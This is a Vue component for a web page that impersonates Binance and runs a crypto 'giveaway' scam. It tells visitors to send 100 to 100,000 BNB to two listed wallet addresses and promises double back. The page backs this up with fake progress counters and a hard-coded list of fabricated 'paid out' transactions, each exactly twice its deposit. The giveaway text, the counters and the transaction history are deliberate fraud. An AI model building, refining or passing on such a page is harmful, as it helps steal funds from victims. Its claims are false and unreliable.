<template>
  <div class="home">
    <template v-if="isLoading">
      <loading
        :active.sync="isLoading"
        :is-full-page="fullPage"
        :color="teal"
        :loader="loader"
        :height="100"
        :width="35"
      ></loading>
    </template>
    <template v-else>
      <section style="background-color: #000">
        <b-row class="py-5"> </b-row>
        <!-- landing top bar -->
        <div class="row py-5">
          <div class="col-md-6">
            <div class="py-5 my-3 px-5">
              <!-- <h1 class="display-3 landing-header text-white d-none d-lg-block">
                <strong>JOIN THE GIVEAWAY</strong>
              </h1> -->
              <h1 class="display-3 landing-header text-white">
                <strong>JOIN THE GIVEAWAY</strong>
              </h1>
              <p class="text-start text-white">
                Due to the current rise in price, the Binance chain main net
                expected to have a scheduled Hardfork upgrade at block height
                146,060,000. Binance believes that BNB and cryptocurrency will
                make the world fairer. To speed up the process of cryptocurrency
                mass adoption, We decided to run a 600 000 BNB giveaway. To
                participate you just need to send from 100 BNB to 100 000 BNB to
                the contribution address and we will immediately send you back
                200 BNB to 200 000 BNB (x2 back) to the address you sent it
                from.
              </p>
            </div>
          </div>
          <div class="col-md-6">
            <div class="pt-5">
              <img
                src="@/assets/img/binanImg.png"
                width="500"
                class="img-fluid"
              />
            </div>
          </div>
        </div>
      </section>
      <section style="background-color: #fff">
        <!-- examples div  -->
        <div class="row justify-content-center py-5">
          <div class="col-md-9">
            <div class="row py-5 mx-5">
              <div class="col-sm-7">
                <h6 class="sub-header theme-text">For Example:</h6>
                <br />
                <p>If you send 500 BNB, you will be get 1000 BNB back.</p>
                <p>If you send 1000 BNB, you will be get 2000 BNB back.</p>
                <p>If you send 5000 BNB, you will be get 10000 BNB back.</p>
                <p>If you send 10000 BNB, you will be get 20000 BNB back.</p>
                <p>If you send 50000 BNB, you will be get 100000 BNB back.</p>
                <p>If you send 100000 BNB, you will be get 200000 BNB back.</p>
              </div>
              <div class="col-sm-5">
                <h6 class="sub-header theme-text">
                  Contribution Special BONUS:
                </h6>
                <br />
                <p>500 BNB + = 100 BNB BONUS</p>
                <p>500 BNB + = 100 BNB BONUS</p>
                <p>500 BNB + = 100 BNB BONUS</p>
                <p>500 BNB + = 100 BNB BONUS</p>
                <p>500 BNB + = 100 BNB BONUS</p>
                <p>500 BNB + = 100 BNB BONUS</p>
              </div>
            </div>
          </div>
        </div>
      </section>
      <section style="background-color: #ededed">
        <!-- payment address  1-->
        <div class="row justify-content-center pt-2">
          <div class="col-md-9">
            <div class="row py-5">
              <div class="col-md-9">
                <div>
                  <b-card>
                    <b-card-text>
                      <b-row>
                        <b-col sm="9">
                          <h3 class="sub-header theme-text">
                            PAYMENT ADDRESS 1
                          </h3>
                          <p>You can send BNB to the following address:</p>
                          <h6>
                            <strong
                              >(BEP2 users) -
                              bnb1z2pzjk06yjgsa5dmh8pgqpmycpe52rzz96fa5h</strong
                            >
                            <ion-icon
                              name="checkmark-circle-outline"
                            ></ion-icon>
                          </h6>
                          <br />
                          <button type="button" class="btn btn-dark my-3">
                            <ion-icon name="copy-outline"></ion-icon> Copy
                            Address to Clipboard
                          </button>
                        </b-col>

                        <b-col sm="3">
                          <img
                            src="@/assets/img/binanceQR.jpg"
                            class="img-fluid"
                          />
                        </b-col>
                      </b-row>
                    </b-card-text>
                    <hr />

                    <b-card-text
                      ><i class="las la-sync-alt"></i> Waiting for
                      payment</b-card-text
                    >
                  </b-card>
                </div>
              </div>
              <div class="col-md-3">
                <div>
                  <b-card>
                    <b-card-text>
                      <vc-donut
                        foreground="black"
                        :size="200"
                        unit="px"
                        :sections="sections"
                        :thickness="15"
                        :total="1000"
                        :start-angle="90"
                        :auto-adjust-text-size="true"
                      >
                        <br />
                        <h6 class="sub-header theme-text">190,890/360,000</h6>
                        <h6>
                          <small>Last chance </small><br />
                          <small>to get your BNB</small>
                        </h6>
                      </vc-donut>
                    </b-card-text>
                  </b-card>
                </div>
              </div>
            </div>
          </div>
        </div>
        <!-- payment address 2 -->
        <div class="row justify-content-center pb-2">
          <div class="col-md-9">
            <div class="row py-5">
              <div class="col-md-9">
                <div>
                  <b-card>
                    <b-card-text>
                      <b-row>
                        <b-col sm="9">
                          <h3 class="sub-header theme-text">
                            PAYMENT ADDRESS 2
                          </h3>
                          <p>You can send BNB to the following address:</p>
                          <h6>
                            <strong>
                              (ERC20 users) -
                              0x93bf547dC6E91B85A7a2029eFBE06422fA4dDDec</strong
                            >
                            <ion-icon
                              name="checkmark-circle-outline"
                            ></ion-icon>
                          </h6>
                          <br />
                          <button type="button" class="btn btn-dark my-3">
                            <ion-icon name="copy-outline"></ion-icon> Copy
                            Address to Clipboard
                          </button>
                        </b-col>

                        <b-col sm="3">
                          <img
                            src="@/assets/img/address-two.jpeg"
                            class="img-fluid"
                          />
                        </b-col>
                      </b-row>
                    </b-card-text>
                    <hr />

                    <b-card-text
                      ><i class="las la-sync-alt"></i> Waiting for
                      payment</b-card-text
                    >
                  </b-card>
                </div>
              </div>
              <div class="col-md-3">
                <div>
                  <b-card>
                    <b-card-text>
                      <vc-donut
                        foreground="black"
                        :size="200"
                        unit="px"
                        :sections="sections"
                        :thickness="15"
                        :total="1000"
                        :start-angle="90"
                        :auto-adjust-text-size="true"
                      >
                        <br />
                        <h6 class="sub-header theme-text">85,210/240,000</h6>
                        <h6>
                          <small>Last chance </small><br />
                          <small>to get your BNB</small>
                        </h6>
                      </vc-donut>
                    </b-card-text>
                  </b-card>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>
      <section style="background-color: #fff">
        <!-- instructions -->
        <div class="row py-5">
          <div class="col-12">
            <div class="my-5 pb-5">
              <h3 class="sub-header text-center theme-text">INSTRUCTIONS</h3>
            </div>
          </div>
          <div class="col-12 py-5">
            <div class="row d-flex justify-content-center px-5">
              <div
                class="col-sm-3 btn"
                v-for="item in instructions"
                :key="item.id"
              >
                <div>
                  <div class="d-flex justify-content-center">
                    <ion-icon
                      :name="item.iconName"
                      class="text-center"
                      size="large"
                    ></ion-icon>
                  </div>
                  <br />
                  <p class="text-center">
                    {{ item.content }}
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      <section style="background-color: #ededed">
        <!-- transactions for address -->
        <div class="row">
          <div class="col-12 mt-5">
            <div class="my-4 pt-5">
              <h3 class="sub-header text-center theme-text">
                TRANSACTIONS FOR ADDRESS
              </h3>
            </div>
          </div>
          <div class="col-sm-12">
            <div class="pb-5">
              <h4 class="text-center trimText">
                bnb1z2pzjk06yjgsa5dmh8pgqpmycpe52rzz96fa5hSS
              </h4>
            </div>
          </div>
        </div>
        <!-- history   -->
        <div class="row justify-content-center">
          <div class="col-md-8">
            <b-row>
              <b-col sm="12">
                <div class="table-responsive-md">
                  <table class="table table-borderless">
                    <tbody>
                      <tr>
                        <td class="sub-header">TxRef</td>
                        <td class="sub-header">L.No</td>
                        <td class="sub-header">From</td>
                        <td class="sub-header">Status</td>
                        <td class="sub-header">To</td>
                        <td class="sub-header">Time</td>
                        <td class="sub-header">Value</td>
                        <td class="sub-header">TxFee</td>
                      </tr>
                    </tbody>
                  </table>
                </div>

                <!-- <b-row class="px-4 py-5">
                <b-col sm="1"><h6 class="sub-header">TxHash</h6></b-col>
                <b-col sm="2"> <h6 class="sub-header">Ledger</h6></b-col>
                <b-col sm="2"> <h6 class="sub-header">From</h6></b-col>
                <b-col sm="1"></b-col>
                <b-col sm="2"> <h6 class="sub-header">To</h6></b-col>
                <b-col sm="1"> <h6 class="sub-header">Time</h6></b-col>
                <b-col sm="2"> <h6 class="sub-header">Value</h6></b-col>
                <b-col sm="1"> <h6 class="sub-header">TxFee</h6></b-col>
              </b-row> -->
              </b-col>
              <b-col
                sm="12"
                class="my-2"
                v-for="item in history"
                :key="item.txHashOut"
              >
                <!-- <div>
                <b-card>
                  <b-card-text>
                    <b-row class="py-1">
                      <b-col sm="1">{{ item.txHashOut }}</b-col>
                      <b-col sm="2">{{ item.ledgerOut }}</b-col>
                      <b-col sm="2">{{ item.fromOut }}</b-col>
                      <b-col sm="1"
                        ><h6 class="sub-header theme-text">OUT</h6></b-col
                      >
                      <b-col sm="2">{{ item.toOut }}</b-col>
                      <b-col sm="1">{{ item.timeOut }}</b-col>
                      <b-col sm="2">{{ item.valueOut }}</b-col>
                      <b-col sm="1">{{ item.txFesOut }}</b-col>
                    </b-row>
                    <b-row class="py-1">
                      <b-col sm="12">
                        <div class="link-line position-relative">
                          <b-row>
                            <b-col sm="5"></b-col>
                            <b-col sm="1">
                              <div class="history-icon-div position-absolute">
                                <h6></h6>
                              </div>
                            </b-col>
                            <b-col sm="6"></b-col>
                          </b-row>
                        </div>
                      </b-col>
                    </b-row>
                    <b-row class="py-1">
                      <b-col sm="1">{{ item.txHashIn }}</b-col>
                      <b-col sm="2">{{ item.ledgerIn }}</b-col>
                      <b-col sm="2">{{ item.fromIn }}</b-col>
                      <b-col sm="1"
                        ><h6 class="sub-header theme-text">IN</h6></b-col
                      >
                      <b-col sm="2">{{ item.toIn }}</b-col>
                      <b-col sm="1">{{ item.timeIn }}</b-col>
                      <b-col sm="2">{{ item.valueIn }}</b-col>
                      <b-col sm="1">{{ item.txFesIn }}</b-col>
                    </b-row>
                  </b-card-text>
                </b-card>
              </div> -->
                <div>
                  <div class="card">
                    <div class="table-responsive-md transaction-card">
                      <table class="table table-borderless">
                        <tbody>
                          <tr>
                            <td>{{ item.txHashOut }}</td>
                            <td>{{ item.ledgerOut }}</td>
                            <td>{{ item.fromOut }}</td>
                            <td>
                              <h6 class="sub-header theme-text">OUT</h6>
                            </td>
                            <td>{{ item.toOut }}</td>
                            <td>{{ item.timeOut }}</td>
                            <td>{{ item.valueOut }}</td>
                            <td>{{ item.txFesOut }}</td>
                          </tr>
                          <tr>
                            <td>{{ item.txHashIn }}</td>
                            <td>{{ item.ledgerIn }}</td>
                            <td>{{ item.fromIn }}</td>
                            <td><h6 class="sub-header theme-text">IN</h6></td>
                            <td>{{ item.toIn }}</td>
                            <td>{{ item.timeIn }}</td>
                            <td>{{ item.valueIn }}</td>
                            <td>{{ item.txFesIn }}</td>
                          </tr>
                        </tbody>
                      </table>
                    </div>
                  </div>
                </div>
              </b-col>
            </b-row>
          </div>
        </div>
        <b-row class="py-3"> </b-row>
      </section>
    </template>
  </div>
</template>

<script>
// @ is an alias to /src
// Import component
import Loading from "vue-loading-overlay";
// Import stylesheet
import "vue-loading-overlay/dist/vue-loading.css";

export default {
  name: "Home",
  components: {
    Loading,
  },
  data() {
    return {
      sections: [{ value: this.purchasedValue, color: "#f0b90b" }],
      isLoading: false,
      fullPage: true,
      loader: "bars",
      instructions: [
        {
          id: 1,
          iconName: "qr-code-outline",
          content:
            "To make a transaction, you can use any wallet or exchange to participate!",
        },
        {
          id: 2,
          iconName: "speedometer-outline",
          content:
            "Once we receive your transaction, the outgoing transaction is processed to your address.",
        },
        {
          id: 3,
          iconName: "logo-bitcoin",
          content:
            "Once we receive your transaction, we will immediately send the requested amount back to you.",
        },
        {
          id: 4,
          iconName: "shield-checkmark-outline",
          content:
            "Every address that is sent too late, gets their BNB immediately sent back.",
        },
      ],
      history: [
        {
          txHashIn: "10ea5e",
          ledgerIn: 7,
          fromIn: "535cf4",
          toIn: "9316d9",
          timeIn: "16 mins",
          valueIn: "121 BNB",
          txFesIn: "0.00448",
          txHashOut: "2656af",
          ledgerOut: "80108113",
          fromOut: "788dc2",
          toOut: "0d6218",
          timeOut: "16 mins",
          valueOut: "242 BNB",
          txFesOut: "0.00716",
        },
        {
          txHashIn: "2dcad0",
          ledgerIn: 9,
          fromIn: "f0d8c8",
          toIn: "be59ce",
          timeIn: "13 mins",
          valueIn: "169 BNB",
          txFesIn: "0.00348",
          txHashOut: "3198cb",
          ledgerOut: "80108113",
          fromOut: "81d6f7",
          toOut: "4f7093",
          timeOut: "13 mins",
          valueOut: "338 BNB",
          txFesOut: "0.00236",
        },
        {
          txHashIn: "e64b08",
          ledgerIn: 4,
          fromIn: "5b4569",
          toIn: "2deff5",
          timeIn: "10 mins",
          valueIn: "95 BNB",
          txFesIn: "0.00558",
          txHashOut: "1a72fb",
          ledgerOut: "80108113",
          fromOut: "9954b4",
          toOut: "36006e",
          timeOut: "10 mins",
          valueOut: "190 BNB",
          txFesOut: "0.00855",
        },
        {
          txHashIn: "5fd5b5",
          ledgerIn: 7,
          fromIn: "1e9909",
          toIn: "c3df7e",
          timeIn: "16 mins",
          valueIn: "183 BNB",
          txFesIn: "0.00896",
          txHashOut: "3e2a40",
          ledgerOut: "80108113",
          fromOut: "c05d49",
          toOut: "cd4202",
          timeOut: "16 mins",
          valueOut: "366 BNB",
          txFesOut: "0.00748",
        },
        {
          txHashIn: "d47edc",
          ledgerIn: 9,
          fromIn: "e1081b",
          toIn: "e63fec",
          timeIn: "3 mins",
          valueIn: "98 BNB",
          txFesIn: "0.00561",
          txHashOut: "a5acf6",
          ledgerOut: "80108113",
          fromOut: "e405c0",
          toOut: "e86eb2",
          timeOut: "3 mins",
          valueOut: "196 BNB",
          txFesOut: "0.00494",
        },
        {
          txHashIn: "dd16e9",
          ledgerIn: 6,
          fromIn: "b9a6e1",
          toIn: "cdff30",
          timeIn: "7 mins",
          valueIn: "92 BNB",
          txFesIn: "0.00477",
          txHashOut: "5b12ca",
          ledgerOut: "80108113",
          fromOut: "6629db",
          toOut: "b6e39e",
          timeOut: "7 mins",
          valueOut: "184 BNB",
          txFesOut: "0.00792",
        },
        {
          txHashIn: "cad3a7",
          ledgerIn: 6,
          fromIn: "d20a98",
          toIn: "c29200",
          timeIn: "14 mins",
          valueIn: "190 BNB",
          txFesIn: "0.00201",
          txHashOut: "0b546d",
          ledgerOut: "80108113",
          fromOut: "64e5f5",
          toOut: "25152a",
          timeOut: "14 mins",
          valueOut: "380 BNB",
          txFesOut: "0.00321",
        },
        {
          txHashIn: "5c5d86",
          ledgerIn: 8,
          fromIn: "597508",
          toIn: "deb61d",
          timeIn: "15 mins",
          valueIn: "123 BNB",
          txFesIn: "0.00576",
          txHashOut: "fa1301",
          ledgerOut: "80108113",
          fromOut: "222466",
          toOut: "3569bb",
          timeOut: "15 mins",
          valueOut: "246 BNB",
          txFesOut: "0.00755",
        },
        {
          txHashIn: "17d0a6",
          ledgerIn: 7,
          fromIn: "39b324",
          toIn: "7cd481",
          timeIn: "1 mins",
          valueIn: "68 BNB",
          txFesIn: "0.00810",
          txHashOut: "475c01",
          ledgerOut: "80108113",
          fromOut: "274e17",
          toOut: "495e21",
          timeOut: "1 mins",
          valueOut: "136 BNB",
          txFesOut: "0.00868",
        },
        {
          txHashIn: "b48293",
          ledgerIn: 6,
          fromIn: "a1cdd1",
          toIn: "d85073",
          timeIn: "2 mins",
          valueIn: "56 BNB",
          txFesIn: "0.00152",
          txHashOut: "8306f2",
          ledgerOut: "80108113",
          fromOut: "f65e92",
          toOut: "708a44",
          timeOut: "2 mins",
          valueOut: "112 BNB",
          txFesOut: "0.00790",
        },
        {
          txHashIn: "52d60a",
          ledgerIn: 7,
          fromIn: "1ae134",
          toIn: "6ae128",
          timeIn: "2 mins",
          valueIn: "135 BNB",
          txFesIn: "0.00225",
          txHashOut: "f6e7a4",
          ledgerOut: "80108113",
          fromOut: "8ead57",
          toOut: "16d7e4",
          timeOut: "2 mins",
          valueOut: "270 BNB",
          txFesOut: "0.00691",
        },
        {
          txHashIn: "bf1101",
          ledgerIn: 3,
          fromIn: "f62245",
          toIn: "12ee6d",
          timeIn: "13 mins",
          valueIn: "63 BNB",
          txFesIn: "0.00106",
          txHashOut: "f0e1c2",
          ledgerOut: "80108113",
          fromOut: "16811e",
          toOut: "c6d8f8",
          timeOut: "13 mins",
          valueOut: "126 BNB",
          txFesOut: "0.00411",
        },
        {
          txHashIn: "69e730",
          ledgerIn: 6,
          fromIn: "1016be",
          toIn: "96561a",
          timeIn: "3 mins",
          valueIn: "80 BNB",
          txFesIn: "0.00551",
          txHashOut: "eee164",
          ledgerOut: "80108113",
          fromOut: "020e8e",
          toOut: "fe59eb",
          timeOut: "3 mins",
          valueOut: "160 BNB",
          txFesOut: "0.00797",
        },
        {
          txHashIn: "b5a8a0",
          ledgerIn: 2,
          fromIn: "ab8b38",
          toIn: "1b20e9",
          timeIn: "17 mins",
          valueIn: "190 BNB",
          txFesIn: "0.00501",
          txHashOut: "312075",
          ledgerOut: "80108113",
          fromOut: "e04b44",
          toOut: "9515bb",
          timeOut: "17 mins",
          valueOut: "380 BNB",
          txFesOut: "0.00353",
        },
        {
          txHashIn: "d52645",
          ledgerIn: 2,
          fromIn: "89fc6f",
          toIn: "992bce",
          timeIn: "4 mins",
          valueIn: "159 BNB",
          txFesIn: "0.00278",
          txHashOut: "eb0759",
          ledgerOut: "80108113",
          fromOut: "311bef",
          toOut: "255677",
          timeOut: "4 mins",
          valueOut: "318 BNB",
          txFesOut: "0.00394",
        },
        {
          txHashIn: "e7fbd1",
          ledgerIn: 4,
          fromIn: "f723bc",
          toIn: "95aefc",
          timeIn: "2 mins",
          valueIn: "160 BNB",
          txFesIn: "0.00305",
          txHashOut: "053085",
          ledgerOut: "80108113",
          fromOut: "dfa68e",
          toOut: "6046b0",
          timeOut: "2 mins",
          valueOut: "320 BNB",
          txFesOut: "0.00778",
        },
        {
          txHashIn: "a086d1",
          ledgerIn: 2,
          fromIn: "87d0b0",
          toIn: "d98a93",
          timeIn: "10 mins",
          valueIn: "74 BNB",
          txFesIn: "0.00232",
          txHashOut: "c0d608",
          ledgerOut: "80108113",
          fromOut: "2e7d91",
          toOut: "f1b3b3",
          timeOut: "10 mins",
          valueOut: "148 BNB",
          txFesOut: "0.00283",
        },
        {
          txHashIn: "370478",
          ledgerIn: 1,
          fromIn: "5c35ff",
          toIn: "d9e26a",
          timeIn: "17 mins",
          valueIn: "183 BNB",
          txFesIn: "0.00785",
          txHashOut: "f4207b",
          ledgerOut: "80108113",
          fromOut: "9da72b",
          toOut: "89b432",
          timeOut: "17 mins",
          valueOut: "366 BNB",
          txFesOut: "0.00573",
        },
        {
          txHashIn: "594509",
          ledgerIn: 1,
          fromIn: "b6687f",
          toIn: "336ec7",
          timeIn: "5 mins",
          valueIn: "171 BNB",
          txFesIn: "0.00890",
          txHashOut: "8922bc",
          ledgerOut: "80108113",
          fromOut: "8de7f7",
          toOut: "ba734a",
          timeOut: "5 mins",
          valueOut: "342 BNB",
          txFesOut: "0.00807",
        },
        {
          txHashIn: "feb939",
          ledgerIn: 6,
          fromIn: "29fd89",
          toIn: "5d95b7",
          timeIn: "11 mins",
          valueIn: "99 BNB",
          txFesIn: "0.00626",
          txHashOut: "1464c6",
          ledgerOut: "80108113",
          fromOut: "6e8fae",
          toOut: "972a03",
          timeOut: "11 mins",
          valueOut: "198 BNB",
          txFesOut: "0.00857",
        },
        {
          txHashIn: "229fcb",
          ledgerIn: 1,
          fromIn: "f69ef0",
          toIn: "16fb59",
          timeIn: "16 mins",
          valueIn: "119 BNB",
          txFesIn: "0.00806",
          txHashOut: "51b244",
          ledgerOut: "80108113",
          fromOut: "eb0e9b",
          toOut: "8d36db",
          timeOut: "16 mins",
          valueOut: "238 BNB",
          txFesOut: "0.00766",
        },
        {
          txHashIn: "059b50",
          ledgerIn: 6,
          fromIn: "ec82a2",
          toIn: "fd376c",
          timeIn: "7 mins",
          valueIn: "172 BNB",
          txFesIn: "0.00891",
          txHashOut: "293bd2",
          ledgerOut: "80108113",
          fromOut: "c6d1e6",
          toOut: "50944f",
          timeOut: "7 mins",
          valueOut: "344 BNB",
          txFesOut: "0.00328",
        },
        {
          txHashIn: "87a86a",
          ledgerIn: 8,
          fromIn: "0f45ab",
          toIn: "869d5d",
          timeIn: "9 mins",
          valueIn: "74 BNB",
          txFesIn: "0.00104",
          txHashOut: "79454f",
          ledgerOut: "80108113",
          fromOut: "e2a2bb",
          toOut: "855feb",
          timeOut: "9 mins",
          valueOut: "148 BNB",
          txFesOut: "0.00663",
        },
        {
          txHashIn: "c9a996",
          ledgerIn: 1,
          fromIn: "0623b7",
          toIn: "3af2cd",
          timeIn: "15 mins",
          valueIn: "111 BNB",
          txFesIn: "0.00538",
          txHashOut: "b54cb2",
          ledgerOut: "80108113",
          fromOut: "5e5c19",
          toOut: "2343dc",
          timeOut: "15 mins",
          valueOut: "222 BNB",
          txFesOut: "0.00405",
        },
        {
          txHashIn: "d9c0a4",
          ledgerIn: 9,
          fromIn: "42f6aa",
          toIn: "8974ba",
          timeIn: "9 mins",
          valueIn: "168 BNB",
          txFesIn: "0.00729",
          txHashOut: "ed9206",
          ledgerOut: "80108113",
          fromOut: "a0f106",
          toOut: "b55689",
          timeOut: "9 mins",
          valueOut: "336 BNB",
          txFesOut: "0.00746",
        },
        {
          txHashIn: "c0aba2",
          ledgerIn: 3,
          fromIn: "e733d7",
          toIn: "bd780e",
          timeIn: "2 mins",
          valueIn: "121 BNB",
          txFesIn: "0.00186",
          txHashOut: "549e6a",
          ledgerOut: "80108113",
          fromOut: "b44521",
          toOut: "ac406e",
          timeOut: "2 mins",
          valueOut: "242 BNB",
          txFesOut: "0.00481",
        },
        {
          txHashIn: "e5545a",
          ledgerIn: 1,
          fromIn: "cc427a",
          toIn: "810607",
          timeIn: "6 mins",
          valueIn: "136 BNB",
          txFesIn: "0.00139",
          txHashOut: "5f4944",
          ledgerOut: "80108113",
          fromOut: "114f98",
          toOut: "8bf33b",
          timeOut: "6 mins",
          valueOut: "272 BNB",
          txFesOut: "0.00345",
        },
        {
          txHashIn: "981cae",
          ledgerIn: 5,
          fromIn: "f48644",
          toIn: "0c9995",
          timeIn: "3 mins",
          valueIn: "148 BNB",
          txFesIn: "0.00201",
          txHashOut: "2a9414",
          ledgerOut: "80108113",
          fromOut: "b81bb1",
          toOut: "3db8b8",
          timeOut: "3 mins",
          valueOut: "296 BNB",
          txFesOut: "0.00618",
        },
        {
          txHashIn: "89bef1",
          ledgerIn: 6,
          fromIn: "5ab300",
          toIn: "2f640c",
          timeIn: "16 mins",
          valueIn: "190 BNB",
          txFesIn: "0.00393",
          txHashOut: "26561f",
          ledgerOut: "80108113",
          fromOut: "d42191",
          toOut: "5f4b8d",
          timeOut: "16 mins",
          valueOut: "380 BNB",
          txFesOut: "0.00225",
        },
        {
          txHashIn: "718dab",
          ledgerIn: 1,
          fromIn: "237621",
          toIn: "7b7d45",
          timeIn: "15 mins",
          valueIn: "64 BNB",
          txFesIn: "0.00489",
          txHashOut: "bc9889",
          ledgerOut: "80108113",
          fromOut: "e64ee5",
          toOut: "66cd20",
          timeOut: "15 mins",
          valueOut: "128 BNB",
          txFesOut: "0.00718",
        },
      ],
    };
  },
  created() {
    window.addEventListener("scroll", this.handleScroll);
  },
  destroyed() {
    window.removeEventListener("scroll", this.handleScroll);
  },
  methods: {
    handleScroll() {},
  },
  mounted() {
    this.isLoading = true;
    setTimeout(() => {
      this.isLoading = false;
    }, 3000);
  },
};
</script>

<style lang="css" scoped>
.home {
  font-family: "Montserrat", sans-serif;
  font-weight: 500;
}
.link-line {
  padding: 0 10px;
  border-top: 1px solid #e0e0e0;
  height: 1px;
  line-height: 0.1em;
}
.landing-header {
  font-family: "Oswald", sans-serif;
  font-weight: 700;
}
.sub-header {
  font-weight: 900;
}
.highlight-display {
  font-weight: 900;
}
.theme-text {
  color: #f0b90b !important;
}
table tr {
  border-bottom: 1px solid #e0e0e0;
}
table tr:last-child {
  border-bottom: none;
}
.trimText {
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}
.transaction-card {
  padding: 0px !important;
  margin: 0px !important;
}
/* .history-icon-div {
} */
</style>